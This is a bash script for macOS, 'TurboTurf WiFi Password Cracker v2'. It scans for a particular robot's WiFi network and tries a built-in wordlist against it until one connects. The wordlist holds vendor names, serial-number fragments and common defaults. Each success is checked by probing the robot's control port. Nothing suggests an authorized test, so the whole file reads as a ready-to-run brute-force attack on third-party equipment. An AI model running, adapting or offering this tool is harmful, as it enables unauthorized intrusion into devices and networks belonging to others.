#!/bin/bash
# TurboTurf WiFi Password Cracker v2
# Waits for robot network to appear, then attempts passwords
# Self-preserving: saves progress and can resume

SSID_PATTERN="TY126AA"  # Matches TY126AA003F0-XXXXXX
ROBOT_IP="192.168.20.22"
ROBOT_PORT="9090"
PROGRESS_FILE="/tmp/wifi_crack_progress.txt"
SUCCESS_FILE="/tmp/wifi_crack_success.txt"
LOG_FILE="/tmp/wifi_crack_log.txt"
TRIED_FILE="/tmp/wifi_tried.txt"

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log() {
    local msg=$(echo -e "$1" | sed 's/\x1b\[[0-9;]*m//g')
    echo -e "$1"
    echo "$(date '+%H:%M:%S') $msg" >> "$LOG_FILE"
}

# Check if already found
if [ -f "$SUCCESS_FILE" ]; then
    PASSWORD=$(cat "$SUCCESS_FILE")
    log "${GREEN}Already cracked! Password: $PASSWORD${NC}"
    exit 0
fi

# Get WiFi interface
INTERFACE=$(networksetup -listallhardwareports | awk '/Wi-Fi|AirPort/{getline; print $2}')
log "Using interface: $INTERFACE"

# Scan for robot networks
scan_networks() {
    /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null | grep "$SSID_PATTERN" | awk '{print $1}'
}

# Wait for robot network to appear
wait_for_network() {
    log "${CYAN}Waiting for robot WiFi ($SSID_PATTERN*)...${NC}"
    log "${CYAN}(Power on the robot if not already on)${NC}"

    local scan_count=0
    while true; do
        ((scan_count++))

        local found_ssid=$(scan_networks | head -1)

        if [ -n "$found_ssid" ]; then
            log "${GREEN}Found network: $found_ssid${NC}"
            echo "$found_ssid"
            return 0
        fi

        # Progress indicator every 6 scans (30 sec)
        if ((scan_count % 6 == 0)); then
            log "${CYAN}Scanning... ($((scan_count * 5))s elapsed, waiting for robot)${NC}"
        fi

        sleep 5
    done
}

# Password list - educated guesses
generate_passwords() {
    cat << 'PASSWORDS'
12345678
88888888
00000000
11111111
123456789
1234567890
87654321
smait123
smait888
smaitbot
smaitrobot
smait2024
smaitbase
pudu1234
pudu8888
pudubot1
pudutech
pudurobot
pudu2024
yutong123
yutong888
robotbase
robot123
robot888
base1234
base8888
TY126AA0
TY126AA003F0
005993TY
TY005993
03F0005993
AA003F0005
126AA003
005993005993
00599300
59930059
F0005993
3F0005993
03F00059
AA003F00
26AA003F
T126AA00
Y126AA00
YHDE123D
DE123DD0
DE123DD005F4
05F4SZGM
SZGM2112
21120016
00167230
01040196
30010401
96001672
67230010
10401960
04019603
19603001
96030010
16723001
72300104
23001040
smaitsmait
pudupudu
password
admin123
adminadmin
guest123
guestguest
qwerty123
qwertyui
asdfghjk
zxcvbnm1
1qaz2wsx
wifi1234
wifi8888
wifiwifi
default1
defaultpw
changeme
letmein1
welcome1
abcd1234
1234abcd
a1234567
1a2b3c4d
test1234
testing1
robot2024
base2024
2024robot
20241234
12342024
turf1234
turboturf
delivery
delivery1
navigate1
wayfinder
transport
00000001
11111112
22222222
33333333
44444444
55555555
66666666
77777777
99999999
12341234
56785678
98769876
abcdefgh
password1
passw0rd
wireless
security
internet
network1
connect1
wlan1234
wlan8888
PASSWORDS
}

# Try to connect with password
try_password() {
    local ssid="$1"
    local password="$2"

    # Check if already tried
    if grep -qxF "$password" "$TRIED_FILE" 2>/dev/null; then
        return 1
    fi

    log "${YELLOW}Trying: $password${NC}"

    # Attempt connection
    networksetup -setairportnetwork "$INTERFACE" "$ssid" "$password" 2>/dev/null
    sleep 3

    # Check if connected
    local current=$(networksetup -getairportnetwork "$INTERFACE" 2>/dev/null | awk -F': ' '{print $2}')

    if [ "$current" = "$ssid" ]; then
        sleep 2

        # Verify we can reach the robot
        if nc -z -w 3 "$ROBOT_IP" "$ROBOT_PORT" 2>/dev/null; then
            log "${GREEN}SUCCESS! Password: $password${NC}"
            echo "$password" > "$SUCCESS_FILE"
            afplay /System/Library/Sounds/Glass.aiff 2>/dev/null &
            return 0
        else
            log "${YELLOW}WiFi connected but robot port unreachable...${NC}"
        fi
    fi

    # Mark as tried
    echo "$password" >> "$TRIED_FILE"
    return 1
}

# Main cracking loop
crack_network() {
    local ssid="$1"
    local count=0
    local start_time=$(date +%s)

    log "${CYAN}Starting password attack on $ssid${NC}"
    log "Target: $ROBOT_IP:$ROBOT_PORT"

    while IFS= read -r password; do
        [[ -z "$password" || "$password" =~ ^# ]] && continue
        [ ${#password} -lt 8 ] && continue

        ((count++))

        if try_password "$ssid" "$password"; then
            local elapsed=$(($(date +%s) - start_time))
            log "${GREEN}Cracked in $count attempts (${elapsed}s)${NC}"
            return 0
        fi

        # Progress every 10 attempts
        if ((count % 10 == 0)); then
            echo "$count" > "$PROGRESS_FILE"
            log "${CYAN}Progress: $count passwords tested${NC}"
        fi

        sleep 1
    done < <(generate_passwords)

    log "${RED}Exhausted $count passwords without success${NC}"
    return 1
}

# Main
main() {
    log "=== TurboTurf WiFi Cracker v2 ==="
    log "Looking for: ${SSID_PATTERN}*"
    log "---"

    # Initialize tried file
    touch "$TRIED_FILE"

    # Wait for network
    local target_ssid=$(wait_for_network)

    # Crack it
    if crack_network "$target_ssid"; then
        log "${GREEN}=== VICTORY ===${NC}"
        log "Network: $target_ssid"
        log "Password: $(cat $SUCCESS_FILE)"
    else
        log "${RED}=== FAILED ===${NC}"
        log "Try adding more password candidates"
    fi
}

# Trap interrupts
trap 'log "Interrupted"; exit 1' INT TERM

# Run
main
